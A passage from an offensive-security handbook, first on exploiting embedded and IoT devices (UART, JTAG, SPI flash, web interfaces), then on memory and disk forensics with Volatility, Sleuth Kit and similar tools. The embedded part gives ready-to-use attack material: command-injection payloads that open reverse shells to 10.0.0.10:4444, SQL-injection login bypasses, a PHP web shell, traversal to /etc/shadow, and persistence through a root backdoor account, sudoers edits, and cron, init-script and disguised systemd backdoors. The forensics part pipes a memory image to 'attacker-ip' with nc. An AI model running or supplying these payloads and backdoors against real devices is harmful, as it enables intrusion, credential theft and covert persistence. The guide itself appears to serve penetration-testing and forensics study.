ps aux
netstat -antp
cat /proc/mounts
```

**Login Required**

```bash
# Try default credentials:
root:root
admin:admin
root:(blank)
admin:password

# Interrupt boot process
# Watch boot sequence, press Ctrl+C or specific key
# May drop into U-Boot or bootloader
```

**Bootloader Exploitation**

```bash
# U-Boot is common embedded bootloader
# Often has console access via UART

# Common U-Boot commands:
printenv          # Show environment variables
setenv bootargs "init=/bin/sh"  # Modify boot parameters
saveenv           # Save changes
boot              # Boot with modified parameters

# Single-user mode
setenv bootargs "root=/dev/mtdblock2 rootfstype=squashfs init=/bin/sh"
boot

# Extract firmware via UART
md.b 0x80000000 0x800000  # Memory dump
# Save output to file
```

**JTAG (Joint Test Action Group)**

JTAG provides hardware debugging and direct memory access.

**Identifying JTAG Pins**

```
Standard JTAG signals (minimum):
- TDI (Test Data In)
- TDO (Test Data Out)
- TCK (Test Clock)
- TMS (Test Mode Select)
- GND
- VCC (optional)

Common pinouts:
- 20-pin ARM JTAG
- 14-pin JTAG
- 10-pin Cortex Debug
- Custom layouts

Identification methods:
- Visual inspection (labeled pins)
- Multimeter testing
- JTAGulator (automated pin finding)
```

**Using JTAGulator**

```bash
# Hardware: JTAGulator device
# Connects to suspected JTAG pins and tests combinations

# Connect JTAGulator
screen /dev/ttyUSB0 115200

# Commands:
i  # Display channel information
v  # Set target voltage
p  # Pin mapping
j  # JTAG scan
u  # UART scan

# Once JTAG pins identified, use with OpenOCD
```

**OpenOCD (Open On-Chip Debugger)**

```bash
# Install
apt-get install openocd

# Basic configuration file
cat > openocd.cfg << EOF
interface ftdi
ftdi_vid_pid 0x0403 0x6010
ftdi_layout_init 0x0088 0x008b

transport select jtag
adapter_khz 1000

set CHIPNAME arm
set ENDIAN little

jtag newtap $CHIPNAME cpu -irlen 4 -ircapture 0x1 -irmask 0xf -expected-id 0x07b7617f

target create $CHIPNAME.cpu arm926ejs -endian $ENDIAN -chain-position $CHIPNAME.cpu
EOF

# Connect
openocd -f openocd.cfg

# In separate terminal
telnet localhost 4444

# OpenOCD commands:
reset halt            # Reset and halt CPU
mdw 0x0 0x100         # Memory dump
mww 0x40000000 0x12345678  # Memory write
load_image firmware.bin 0x0  # Upload firmware
dump_image dump.bin 0x0 0x100000  # Download memory
```

**Extracting Firmware via JTAG**

```bash
# Connect with OpenOCD
telnet localhost 4444

# Dump flash memory
dump_image flash.bin 0x0 0x800000

# For large dumps, script it
for offset in 0x0 0x100000 0x200000 0x300000; do
    dump_image dump_$offset.bin $offset 0x100000
done

# Combine dumps
cat dump_*.bin > complete_flash.bin
```

**SPI/I2C Flash Memory Direct Access**

**Identifying Flash Chips**

```bash
# Common flash chips:
# - Winbond W25Q series
# - Macronix MX25L series
# - Spansion S25FL series

# Markings on chip indicate model
# Datasheet lookup for pinout
```

**Reading SPI Flash with Bus Pirate**

```bash
# Hardware: Bus Pirate
# Connect to SPI flash chip

# Bus Pirate connection
screen /dev/ttyUSB0 115200

# Commands:
m         # Mode selection
5         # SPI
3         # Speed
W         # Power supply on
P         # Pull-ups on

# Read chip ID
[0x9f r:3]

# Dump flash (requires scripting)
# Use flashrom for easier access
```

**Using Flashrom**

```bash
# Install
apt-get install flashrom

# Identify chip
flashrom -p buspirate_spi:dev=/dev/ttyUSB0

# Read flash
flashrom -p buspirate_spi:dev=/dev/ttyUSB0 -r flash_dump.bin

# Write flash (for modification/backdoor)
flashrom -p buspirate_spi:dev=/dev/ttyUSB0 -w modified_flash.bin

# Verify
flashrom -p buspirate_spi:dev=/dev/ttyUSB0 -v flash_dump.bin
```

**Using CH341A Programmer**

```bash
# Cheaper alternative to Bus Pirate for SPI flash
# Direct chip programmer

# With flashrom
flashrom -p ch341a_spi -r flash.bin

# Faster than Bus Pirate
# Requires chip removal or in-circuit connection
```

### Reverse Engineering Embedded Protocols

**Network Protocol Analysis**

```bash
# Capture traffic between device and app/cloud
tcpdump -i eth0 -w device_traffic.pcap host 192.168.1.100

# Analyze in Wireshark
# Look for:
# - Custom protocols on unusual ports
# - Authentication mechanisms
# - Command structures
# - Encryption (or lack thereof)
```

**Mobile App Reverse Engineering**

**Android APK Analysis**

```bash
# Decompile APK
apktool d application.apk

# Examine manifest
cat application/AndroidManifest.xml

# Find API endpoints
grep -r "http://" application/
grep -r "https://" application/

# Extract hardcoded credentials
grep -r "password" application/
grep -r "api_key" application/

# Decompile to Java
jadx -d output application.apk

# Analyze Java code for protocol implementation
```

**iOS IPA Analysis**

```bash
# Extract IPA (ZIP file)
unzip application.ipa

# Analyze Info.plist
plutil -p Payload/Application.app/Info.plist

# Dump strings
strings Payload/Application.app/Application

# Disassemble with Hopper/Ghidra
```

**Bluetooth/BLE Analysis**

```bash
# Install bluez tools
apt-get install bluez

# Scan for devices
hcitool lescan

# Get device info
hcitool info <MAC_ADDRESS>

# Using gatttool for BLE
gatttool -b <MAC_ADDRESS> -I
connect
primary          # List services
characteristics  # List characteristics
char-read-hnd 0x000e  # Read characteristic
char-write-req 0x000e 01  # Write characteristic

# BLE sniffing with Ubertooth
ubertooth-btle -f -c capture.pcap
```

### Exploiting Embedded Web Interfaces

**Command Injection**

```bash
# Common injection points:
# - Ping/network diagnostic tools
# - System time settings
# - Log file viewing
# - Firmware upgrade functions

# Test payloads:
127.0.0.1; id
127.0.0.1 & whoami
127.0.0.1 | cat /etc/passwd
$(id)
`whoami`

# Reverse shell
127.0.0.1; bash -i >& /dev/tcp/10.0.0.10/4444 0>&1
127.0.0.1; nc 10.0.0.10 4444 -e /bin/sh
```

**Authentication Bypass**

```bash
# SQL injection in login
admin' OR '1'='1
admin'--
' OR 1=1--

# Cookie manipulation
# Change role=user to role=admin

# Session token prediction
# Weak random number generators

# Direct URL access
# Access admin pages without authentication:
http://192.168.1.100/admin.cgi
http://192.168.1.100/cgi-bin/admin
```

**File Upload Vulnerabilities**

```bash
# Upload web shell
# Change file extension: shell.php.jpg
# Null byte: shell.php%00.jpg
# Double extension: shell.php.png

# Web shell content (PHP):
<?php system($_GET['cmd']); ?>

# Access uploaded shell:
http://192.168.1.100/uploads/shell.php?cmd=id
```

**Directory Traversal**

```bash
# Common parameters:
file=../../../etc/passwd
page=../../../../etc/shadow
log=../../../../../../var/log/messages

# URL encoding:
file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Double encoding:
file=%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

### Privilege Escalation on Embedded Devices

**SUID Binaries**

```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Common vulnerable SUID binaries:
# - Custom admin tools
# - Debugging utilities
# - Update mechanisms

# Exploit via PATH manipulation
export PATH=/tmp:$PATH
# Create malicious binary in /tmp
```

**Kernel Exploits**

```bash
# Check kernel version
uname -a
cat /proc/version

# Search for exploits
searchsploit linux kernel 2.6

# Many embedded devices run old kernels
# Compile exploit for target architecture
# Transfer and execute
```

**Writable Configuration Files**

```bash
# Check for writable configs
find /etc -writable 2>/dev/null

# Modify password files (if writable)
echo 'root:$1$xyz$EgTlkWBJnr.LhuNKLZnEK/:0:0:root:/root:/bin/sh' > /etc/passwd

# Modify sudoers
echo 'user ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
```

**Cron Job Manipulation**

```bash
# Check crontabs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# If cron scripts are writable:
echo '* * * * * /bin/bash -i >& /dev/tcp/10.0.0.10/4444 0>&1' >> /etc/cron.d/backdoor
```

### Persistence on Embedded Devices

**Backdoor User Account**

```bash
# Add user to /etc/passwd
echo 'backdoor:x:0:0:backdoor:/root:/bin/sh' >> /etc/passwd

# Set password in /etc/shadow
echo 'backdoor:$6$saltsalt$hashedpassword:18000:0:99999:7:::' >> /etc/shadow
```

**Web Shell Installation**

```bash
# Copy web shell to web root
cp shell.php /var/www/html/.config.php

# Hide in legitimate-looking file
```

**Init Script Modification**

```bash
# Add backdoor to startup scripts
echo '/bin/bash -i >& /dev/tcp/10.0.0.10/4444 0>&1 &' >> /etc/init.d/rcS

# Or systemd service
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Service

[Service]
ExecStart=/tmp/.backdoor

[Install]
WantedBy=multi-user.target
EOF

systemctl enable backdoor.service
```

**Firmware Modification**

```bash
# Extract firmware
binwalk -e firmware.bin

# Modify extracted filesystem
# Add backdoor, credentials, etc.

# Repack firmware
# (Requires understanding of firmware format)
./build-firmware.sh modified_firmware/

# Flash modified firmware to device
```

### Automated Embedded Device Scanners

**Routersploit**

```bash
# Install
git clone https://github.com/threat9/routersploit
cd routersploit
pip3 install -r requirements.txt

# Run
python3 rsf.py

# Commands:
use scanners/autopwn
set target 192.168.1.1
run

# Exploit specific vulnerability:
use exploits/routers/netgear/auth_bypass
set target 192.168.1.1
exploit
```

**IoTSeeker**

```bash
# Scan for IoT devices with default credentials
git clone https://github.com/rapid7/IoTSeeker
cd IoTSeeker

# Scan network
python iotseeker.py -t 192.168.1.0/24
```

**IoT-Toolkit**

```bash
# Collection of IoT assessment tools
git clone https://github.com/arunmagesh/iot-toolkit

# Various modules for different IoT protocols and devices
```

---

## Key Operational Considerations

**Radio Regulations**: Using SDR transmitters for Z-Wave, Zigbee, or other wireless protocol testing may violate radio regulations in many jurisdictions. Ensure proper authorization and use shielded environments when necessary.

**Hardware Modifications**: Opening devices, connecting to debug interfaces, and removing chips can void warranties and potentially damage equipment. Physical security measures may also detect tampering.

**Protocol Replay Protection**: [Inference: Modern implementations of Zigbee and Z-Wave include replay protection through frame counters and nonces. However, many deployed devices use legacy security modes or have implementation flaws that reduce effectiveness of these protections.]

**Firmware Emulation Limitations**: [Unverified: Firmware emulation tools like Firmadyne report varying success rates, with some studies suggesting 60-70% successful emulation for Linux-based router firmware, but significantly lower rates for custom RTOS or highly hardware-dependent systems.]

**Cryptographic Key Storage**: Embedded devices often store cryptographic keys in plaintext in firmware or configuration files due to lack of secure storage hardware. Keys extracted from firmware may work across multiple device instances if not properly diversified.

**UART Security**: Disabling UART access post-production improves security but is often skipped. Even when disabled in software, physical traces remain and can potentially be re-enabled through firmware modification.

**Update Mechanisms**: Embedded devices frequently check signatures on firmware updates. Bypassing signature verification typically requires kernel-level access or hardware modification, though weak implementations may be exploitable.

**Responsible Disclosure**: Vulnerabilities in embedded devices, particularly those affecting critical infrastructure or consumer safety (door locks, cameras, medical devices), require careful responsible disclosure to manufacturers with appropriate timelines before public disclosure.

---

# Forensics & Artifact Analysis

## Memory Dump Analysis

Memory dump analysis extracts volatile data including running processes, network connections, loaded modules, encryption keys, passwords, and malware artifacts from RAM captures.

### Memory Acquisition

**Linux Memory Acquisition**

```bash
# Using LiME (Linux Memory Extractor)
git clone https://github.com/504ensicsLabs/LiME.git
cd LiME/src
make

# Load module and capture memory
insmod lime-$(uname -r).ko "path=/tmp/memory.lime format=lime"

# Alternative: dd (requires root)
dd if=/dev/mem of=/tmp/memory.raw bs=1M
dd if=/dev/crash of=/tmp/memory.raw bs=1M

# Using AVML (faster, more reliable)
wget https://github.com/microsoft/avml/releases/download/v0.13.0/avml
chmod +x avml
./avml memory.lime

# Capture to remote server
./avml - | nc attacker-ip 4444
```

**Windows Memory Acquisition**

```powershell
# Using Magnet RAM Capture (GUI tool)
# Download from: https://www.magnetforensics.com/resources/magnet-ram-capture/

# Using DumpIt
# Download and run: DumpIt.exe
# Output: <HOSTNAME>-<TIMESTAMP>.raw

# Using WinPmem
winpmem_mini_x64.exe memory.raw

# Using Belkasoft RAM Capturer
# GUI tool: https://belkasoft.com/ram-capturer

# PowerShell method (limited, not complete memory)
Get-Process | Export-Csv processes.csv
```

**Verify Memory Dump Integrity**

```bash
# Calculate hash
sha256sum memory.lime

# Check file size (should match RAM size)
ls -lh memory.lime

# Verify format
file memory.lime
```

### Volatility 3 Framework

**Installation**

```bash
# Install Python dependencies
pip3 install volatility3

# Or clone from GitHub
git clone https://github.com/volatilityfoundation/volatility3.git
cd volatility3
python3 setup.py install

# Verify installation
vol3 -h
python3 vol.py -h
```

**Basic Information Extraction**

```bash
# List available plugins
vol3 -f memory.lime --help

# Identify operating system
vol3 -f memory.lime banners.Banners
vol3 -f memory.lime linux.bash.Bash  # Linux
vol3 -f memory.raw windows.info.Info  # Windows

# For Windows, identify profile automatically
vol3 -f memory.raw windows.info.Info
```

**Process Analysis**

```bash
# List processes (Linux)
vol3 -f memory.lime linux.pslist.PsList
vol3 -f memory.lime linux.pstree.PsTree  # Tree view

# List processes (Windows)
vol3 -f memory.raw windows.pslist.PsList
vol3 -f memory.raw windows.pstree.PsTree
vol3 -f memory.raw windows.psscan.PsScan  # Find hidden processes

# Process details with command line
vol3 -f memory.raw windows.cmdline.CmdLine
vol3 -f memory.lime linux.psaux.PsAux

# Dump specific process memory
vol3 -f memory.raw windows.memmap.Memmap --pid 1234 --dump

# Dump process executable
vol3 -f memory.raw windows.dumpfiles.DumpFiles --pid 1234
```

**Network Connections**

```bash
# Active network connections (Linux)
vol3 -f memory.lime linux.netstat.Netstat

# Network connections (Windows)
vol3 -f memory.raw windows.netstat.NetStat
vol3 -f memory.raw windows.netscan.NetScan  # More comprehensive

# Extract network artifacts
vol3 -f memory.raw windows.sessions.Sessions
```

**File System Artifacts**

```bash
# List open files (Linux)
vol3 -f memory.lime linux.lsof.Lsof

# Scan for file objects (Windows)
vol3 -f memory.raw windows.filescan.FileScan

# Dump specific file from memory
vol3 -f memory.raw windows.dumpfiles.DumpFiles --virtaddr 0x12345678

# Find file handles
vol3 -f memory.raw windows.handles.Handles --pid 1234
```

**Registry Analysis (Windows)**

```bash
# Print registry hives
vol3 -f memory.raw windows.registry.hivelist.HiveList

# Print registry keys
vol3 -f memory.raw windows.registry.printkey.PrintKey --key "Software\Microsoft\Windows\CurrentVersion\Run"

# User Assist (tracks program execution)
vol3 -f memory.raw windows.registry.userassist.UserAssist

# Shimcache (application compatibility cache)
vol3 -f memory.raw windows.registry.shimcache.ShimCache
```

**Malware Detection**

```bash
# Detect code injection
vol3 -f memory.raw windows.malfind.Malfind

# Check for hooks
vol3 -f memory.raw windows.ssdt.SSDT  # System Service Descriptor Table

# List loaded modules
vol3 -f memory.raw windows.modules.Modules
vol3 -f memory.lime linux.lsmod.Lsmod

# Detect rootkits (Linux)
vol3 -f memory.lime linux.check_syscall.Check_syscall
vol3 -f memory.lime linux.check_modules.Check_modules

# Scan for suspicious processes
vol3 -f memory.raw windows.psscan.PsScan | grep -i "suspicious\|malware\|backdoor"
```

**Credential Extraction**

```bash
# Extract password hashes (Windows)
vol3 -f memory.raw windows.hashdump.Hashdump

# LSA secrets
vol3 -f memory.raw windows.lsadump.Lsadump

# Cached credentials
vol3 -f memory.raw windows.cachedump.Cachedump

# [Inference] For plaintext passwords, use mimikatz plugin or extract lsass.exe process
vol3 -f memory.raw windows.memmap.Memmap --pid <lsass-pid> --dump
# Then analyze with Mimikatz offline
```

**Timeline Analysis**

```bash
# Create timeline (Windows)
vol3 -f memory.raw timeliner.Timeliner --create-bodyfile > timeline.body

# Create Mactime timeline
mactime -b timeline.body -d > timeline.csv

# Alternative: Use timeline plugin directly
vol3 -f memory.raw windows.timeline.Timeline
```

### Volatility 2 (Legacy but Still Useful)

**Installation**

```bash
# Install Volatility 2
git clone https://github.com/volatilityfoundation/volatility.git
cd volatility
python2 setup.py install

# Or use standalone
python2 vol.py -h
```

**Profile Identification (Volatility 2)**

```bash
# Identify image info
python2 vol.py -f memory.raw imageinfo

# Suggested profiles listed in output
# Example: Win7SP1x64, Win10x64_19041

# Use specific profile
python2 vol.py -f memory.raw --profile=Win7SP1x64 pslist
```

**Volatility 2 Unique Plugins**

```bash
# Screenshot extraction (Windows GUI)
python2 vol.py -f memory.raw --profile=Win7SP1x64 screenshot --dump-dir=./screenshots/

# Clipboard contents
python2 vol.py -f memory.raw --profile=Win7SP1x64 clipboard

# Internet Explorer history
python2 vol.py -f memory.raw --profile=Win7SP1x64 iehistory

# Notepad contents
python2 vol.py -f memory.raw --profile=Win7SP1x64 notepad

# Master Boot Record
python2 vol.py -f memory.raw --profile=Win7SP1x64 mbrparser

# Master File Table
python2 vol.py -f memory.raw --profile=Win7SP1x64 mftparser
```

### Specialized Memory Analysis Tools

**Bulk Extractor** - Fast data extraction

```bash
# Install
apt install bulk-extractor

# Run on memory dump
bulk_extractor -o output_dir memory.raw

# Output files include:
# - email.txt: Email addresses
# - url.txt: URLs
# - telephone.txt: Phone numbers
# - ccn.txt: Credit card numbers
# - domain.txt: Domain names
# - ip.txt: IP addresses

# Search for specific patterns
bulk_extractor -o output_dir -x all -e wordlist memory.raw
cat output_dir/wordlist.txt
```

**Strings Analysis**

```bash
# Extract ASCII strings
strings -a -n 8 memory.raw > strings.txt

# Extract Unicode strings
strings -a -el -n 8 memory.raw > strings_unicode.txt

# Search for specific patterns
strings memory.raw | grep -iE "password|pass=|pwd=|token|api_key"

# Search for URLs
strings memory.raw | grep -E "https?://"

# Search for IP addresses
strings memory.raw | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"

# Search for email addresses
strings memory.raw | grep -oE "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b"

# Search for file paths
strings memory.raw | grep -E "C:\\|/home/|/root/"
```

**Yara Rules for Memory Scanning**

```bash
# Install Yara
apt install yara

# Create Yara rule
cat > malware.yar << 'EOF'
rule SuspiciousStrings {
    strings:
        $a = "cmd.exe /c" nocase
        $b = "powershell.exe -enc" nocase
        $c = "IEX(New-Object" nocase
        $d = "DownloadString" nocase
        $e = "mimikatz" nocase
    condition:
        any of them
}

rule NetworkIndicators {
    strings:
        $ip1 = /\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b/
        $url = /https?:\/\/(www\.)?[-a-zA-Z0-9@:%._\+~#=]{2,256}\.[a-z]{2,6}\b/
    condition:
        $ip1 or $url
}
EOF

# Scan memory dump
yara malware.yar memory.raw

# Scan with strings output
yara -s malware.yar memory.raw

# Use community rules
git clone https://github.com/Yara-Rules/rules.git yara-rules
yara -r yara-rules/ memory.raw
```

**Rekall Framework** (Alternative to Volatility)

```bash
# Install
pip3 install rekall-agent rekall

# Interactive session
rekall -f memory.raw

# Run plugin
rekall -f memory.raw pslist

# Output to JSON
rekall -f memory.raw --output=data.json pslist
```

### Advanced Memory Analysis Techniques

**Detect Process Injection**

```bash
# Volatility 3
vol3 -f memory.raw windows.malfind.Malfind

# Look for:
# - Processes with PAGE_EXECUTE_READWRITE permissions
# - Suspicious memory regions
# - Unlinked DLLs

# Check for hollowed processes
vol3 -f memory.raw windows.pslist.PsList
# Compare process path with loaded executable

# Check VAD (Virtual Address Descriptor)
vol3 -f memory.raw windows.vadinfo.VadInfo --pid 1234
```

**Extract Encryption Keys**

```bash
# AES keys
vol3 -f memory.raw linux.elfs.Elfs | grep -i "aes\|crypt"
strings memory.raw | grep -oE "[0-9a-fA-F]{32,64}"

# TrueCrypt/VeraCrypt keys (using findaes)
git clone https://github.com/jessek/findaes.git
cd findaes && make
./findaes memory.raw

# RSA private keys
strings memory.raw | grep -A 20 "BEGIN RSA PRIVATE KEY"

# SSL/TLS session keys
strings memory.raw | grep -A 5 "CLIENT_RANDOM"
```

**Browser Artifact Extraction**

```bash
# Chrome/Chromium history
vol3 -f memory.raw windows.filescan.FileScan | grep -i "History"

# Firefox artifacts
strings memory.raw | grep -i "places.sqlite\|cookies.sqlite"

# Extract browsing history using bulk_extractor
bulk_extractor -o browser_artifacts -e wordlist memory.raw
grep -i "http" browser_artifacts/url.txt
```

**SSH Key Extraction**

```bash
# Search for SSH private keys
strings memory.raw | grep -A 30 "BEGIN OPENSSH PRIVATE KEY"
strings memory.raw | grep -A 30 "BEGIN RSA PRIVATE KEY"

# Search for known_hosts
strings memory.raw | grep -A 5 "known_hosts"

# Extract SSH session data
vol3 -f memory.lime linux.psaux.PsAux | grep ssh
```

**Metadata and Timestamps**

```bash
# Extract file metadata from memory
vol3 -f memory.raw windows.filescan.FileScan --dump

# Analyze timestamps
stat memory.raw

# Create timeline
python3 << 'EOF'
import struct
import datetime

def extract_timestamps(filename):
    with open(filename, 'rb') as f:
        data = f.read()
    
    # Search for FILETIME structures (Windows)
    for i in range(0, len(data) - 8, 8):
        try:
            filetime = struct.unpack('<Q', data[i:i+8])[0]
            if 116444736000000000 < filetime < 200000000000000000:
                dt = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=filetime/10)
                if 2000 < dt.year < 2030:
                    print(f"Offset {hex(i)}: {dt}")
        except:
            pass

extract_timestamps('memory.raw')
EOF
```

---

## Disk Image Analysis

Disk image analysis recovers deleted files, examines file systems, analyzes partition structures, and extracts artifacts from forensic disk images.

### Disk Image Acquisition

**Linux Disk Imaging**

```bash
# Using dd (basic imaging)
dd if=/dev/sda of=/mnt/external/disk_image.raw bs=4M status=progress

# With compression
dd if=/dev/sda bs=4M | gzip > /mnt/external/disk_image.raw.gz

# Using dcfldd (enhanced dd with hashing)
dcfldd if=/dev/sda of=/mnt/external/disk_image.raw hash=sha256 hashlog=/mnt/external/hash.log

# Using dc3dd (forensic imaging)
dc3dd if=/dev/sda of=/mnt/external/disk_image.raw hash=md5 log=/mnt/external/dc3dd.log

# Calculate hash of source
md5sum /dev/sda > source_hash.txt
sha256sum /dev/sda > source_hash.txt
```

**Advanced Imaging Tools**

```bash
# Using FTK Imager (CLI)
# Windows tool, but widely used in forensics

# Using Guymager (GUI for Linux)
apt install guymager
guymager  # Launch GUI

# Using ewfacquire (Expert Witness Format)
apt install ewf-tools
ewfacquire /dev/sda
# Creates .E01 format (compressed forensic image)

# Mount EWF image
ewfmount disk.E01 /mnt/ewf/
```

**Verify Image Integrity**

```bash
# Compare hashes
md5sum disk_image.raw
sha256sum disk_image.raw

# Verify against original
md5sum /dev/sda
md5sum disk_image.raw
# Hashes should match

# Create verification report
cat > verification_report.txt << EOF
Original Device: /dev/sda
Image File: disk_image.raw
Acquisition Date: $(date)
MD5 Source: $(md5sum /dev/sda | awk '{print $1}')
MD5 Image: $(md5sum disk_image.raw | awk '{print $1}')
SHA256 Source: $(sha256sum /dev/sda | awk '{print $1}')
SHA256 Image: $(sha256sum disk_image.raw | awk '{print $1}')
EOF
```

### The Sleuth Kit (TSK)

**File System Analysis**

```bash
# Install
apt install sleuthkit

# Display file system information
fsstat disk_image.raw

# Display partition table
mmls disk_image.raw

# Calculate partition offset
# Offset = Start Sector Ã— Sector Size (usually 512)
# Example: Sector 2048 Ã— 512 = 1048576

# Analyze specific partition
fsstat -o 2048 disk_image.raw
```

**File and Directory Listing**

```bash
# List root directory
fls disk_image.raw

# List specific directory (use inode number)
fls disk_image.raw 5  # inode 5 (usually /etc on Linux)

# Recursive listing
fls -r disk_image.raw

# Show deleted files
fls -d disk_image.raw

# Full recursive listing with deleted files
fls -r -d -p disk_image.raw > file_listing.txt

# With partition offset
fls -o 2048 disk_image.raw
```

**Inode Analysis**

```bash
# Display inode information
istat disk_image.raw 12345

# Shows:
# - File metadata
# - Timestamps (MAC times)
# - Data unit addresses
# - File size

# Display file content by inode
icat disk_image.raw 12345 > extracted_file.txt

# Display deleted file
icat disk_image.raw 12345-128-1 > deleted_file.txt
# Format: inode-type-id for deleted files
```

**Timeline Creation**

```bash
# Create bodyfile (timeline format)
fls -r -m / disk_image.raw > bodyfile.txt

# Create human-readable timeline
mactime -b bodyfile.txt -d > timeline.csv

# Filter by date range
mactime -b bodyfile.txt -d 2024-01-01..2024-12-31 > timeline_2024.csv

# Sort by modification time
mactime -b bodyfile.txt -d | sort -t',' -k4 > timeline_sorted.csv
```

**File Type Analysis**

```bash
# Sort files by extension
fls -r -p disk_image.raw | awk -F/ '{print $NF}' | awk -F. '{if (NF>1) print $NF}' | sort | uniq -c | sort -rn

# Find specific file types
fls -r -p disk_image.raw | grep -i "\.pdf$"
fls -r -p disk_image.raw | grep -i "\.jpg$\|\.png$\|\.gif$"

# Extract all files of specific type
for inode in $(fls -r disk_image.raw | grep "\.pdf$" | awk '{print $2}' | sed 's/:$//'); do
    icat disk_image.raw $inode > extracted_${inode}.pdf
done
```

### Autopsy - Digital Forensics Platform

**Installation and Setup**

```bash
# Install Autopsy
apt install autopsy

# Start Autopsy server
autopsy

# Access web interface
# Open browser: http://localhost:9999/autopsy

# Create new case
# Add data source (disk image)
# Run ingest modules
```

**Command-Line Analysis with Autopsy**

```bash
# Use TSK command-line tools (Autopsy uses TSK backend)

# Create case directory
mkdir case_001
cd case_001

# Document case information
cat > case_info.txt << EOF
Case Number: 001
Examiner: Your Name
Date: $(date)
Evidence: disk_image.raw
Hash: $(sha256sum disk_image.raw | awk '{print $1}')
EOF
```

### Deleted File Recovery

**Foremost - File Carving**

```bash
# Carve files from disk image
foremost -i disk_image.raw -o carved_files/

# Specify file types
foremost -t jpg,png,pdf,doc -i disk_image.raw -o carved_files/

# Use custom configuration
foremost -c custom.conf -i disk_image.raw -o carved_files/

# Verbose output
foremost -v -i disk_image.raw -o carved_files/
```

**Scalpel - Advanced Carving**

```bash
# Configure file types in /etc/scalpel/scalpel.conf
# Uncomment desired file types

# Run scalpel
scalpel disk_image.raw -o scalpel_output/

# Quick mode (faster)
scalpel -q disk_image.raw -o scalpel_output/

# Custom configuration
scalpel -c custom.conf disk_image.raw -o scalpel_output/
```

**PhotoRec - Comprehensive Recovery**

```bash
# Interactive mode
photorec disk_image.raw

# Command-line mode
photorec /d recovered_files /cmd disk_image.raw partition_none,fileopt,everything,search

# Limit to specific file types
# Edit ~/.photorec.cfg
photorec /d recovered_files /cmd disk_image.raw fileopt,mode_ext4,search
```

**TestDisk - Partition Recovery**

```bash
# Launch interactive mode
testdisk disk_image.raw

# Workflow:
# 1. Select disk
# 2. Choose partition table type
# 3. Analyze partition structure
# 4. Advanced â†’ List files
# 5. Navigate and recover files

# Command-line operation (limited)
testdisk /list disk_image.raw
```

### File System Specific Analysis

**NTFS Analysis**

```bash
# Parse Master File Table
python2 vol.py -f disk_image.raw --profile=Win7SP1x64 mftparser > mft.txt

# Analyze with MFTECmd
wget https://github.com/EricZimmerman/MFTECmd/releases/download/v1.2.2.1/MFTECmd.zip
unzip MFTECmd.zip
./MFTECmd -f '$MFT' --csv mft_output

# Parse USN Journal (change journal)
# Extract $UsnJrnl:$J
icat -o 2048 disk_image.raw 0-128-4 > usnjrnl.bin

# Parse with UsnJrnl2Csv
python3 usnjrnl2csv.py usnjrnl.bin > usnjrnl.csv
```

**EXT4 Analysis**

```bash
# Mount read-only
mkdir /mnt/evidence
mount -o ro,loop,offset=1048576 disk_image.raw /mnt/evidence

# Use debugfs
debugfs -R "ls -l" disk_image.raw

# List deleted inodes
debugfs -R "lsdel" disk_image.raw

# Dump inode
debugfs -R "dump <12345> /tmp/recovered_file" disk_image.raw

# Show journal
debugfs -R "logdump" disk_image.raw
```

**APFS/HFS+ Analysis (macOS)**

```bash
# Mount HFS+ image
mount -t hfsplus -o ro,loop disk_image.raw /mnt/evidence

# Analyze with hfsdebug
hfsdebug disk_image.raw

# Extract files
hfs-dump disk_image.raw output_dir/
```

### Registry Analysis (Windows)

**Registry Hive Extraction**

```bash
# List files
fls -r disk_image.raw | grep -iE "SAM|SYSTEM|SOFTWARE|SECURITY|NTUSER"

# Extract registry hives
# SAM (User accounts)
icat disk_image.raw <inode> > SAM

# SYSTEM (System configuration)
icat disk_image.raw <inode> > SYSTEM

# SOFTWARE (Installed software)
icat disk_image.raw <inode> > SOFTWARE

# NTUSER.DAT (User profile)
icat disk_image.raw <inode> > NTUSER.DAT
```

**Registry Analysis with RegRipper**

```bash
# Install RegRipper
git clone https://github.com/keydet89/RegRipper3.0.git
cd RegRipper3.0

# Run against hive
perl rip.pl -r SAM -f sam > sam_analysis.txt
perl rip.pl -r SYSTEM -f system > system_analysis.txt
perl rip.pl -r SOFTWARE -f software > software_analysis.txt
perl rip.pl -r NTUSER.DAT -f ntuser > ntuser_analysis.txt

# List available plugins
perl rip.pl -l

# Run specific plugin
perl rip.pl -r SYSTEM -p compname
```

**Manual Registry Parsing**

```bash
# Using reglookup
apt install reglookup

# List registry keys
reglookup -p / SAM

# Search for specific key
reglookup -p /SAM/Domains/Account/Users SAM

# Export to CSV
reglookup -H SAM > sam_export.csv
```

### Browser Artifact Analysis

**Chrome/Chromium Artifacts**

```bash
# Typical locations in disk image:
# Linux: /home/*/.config/google-chrome/Default/
# Windows: /Users/*/AppData/Local/Google/Chrome/User Data/Default/

# Extract History database
icat disk_image.raw <history-inode> > History

# Parse with Python
python3 << 'EOF'
import sqlite3

conn = sqlite3.connect('History')
cursor = conn.cursor()

# URLs
cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC")
for row in cursor.fetchall():
    print(f"URL: {row[0]}\nTitle: {row[1]}\nVisits: {row[2]}\nLast Visit: {row[3]}\n---")

# Downloads
cursor.execute("SELECT target_path, tab_url, start_time, end_time, total_bytes FROM downloads")
for row in cursor.fetchall():
    print(f"File: {row[0]}\nFrom: {row[1]}\nSize: {row[4]} bytes\n---")

conn.close()
EOF

# Extract Cookies
icat disk_image.raw <cookies-inode> > Cookies
sqlite3 Cookies "SELECT host_key, name, value, creation_utc, expires_utc FROM cookies"

# Extract Login Data (encrypted passwords)
icat disk_image.raw <login-data-inode> > "Login Data"
sqlite3 "Login Data" "SELECT origin_url, username_value, password_value FROM logins"
```

**Firefox Artifacts**

```bash
# Typical locations:
# Linux: /home/*/.mozilla/firefox/*.default-release/
# Windows: /Users/*/AppData/Roaming/Mozilla/Firefox/Profiles/*.default-release/

# Extract places.sqlite (history/bookmarks)
icat disk_image.raw <places-inode> > places.sqlite

# Parse history
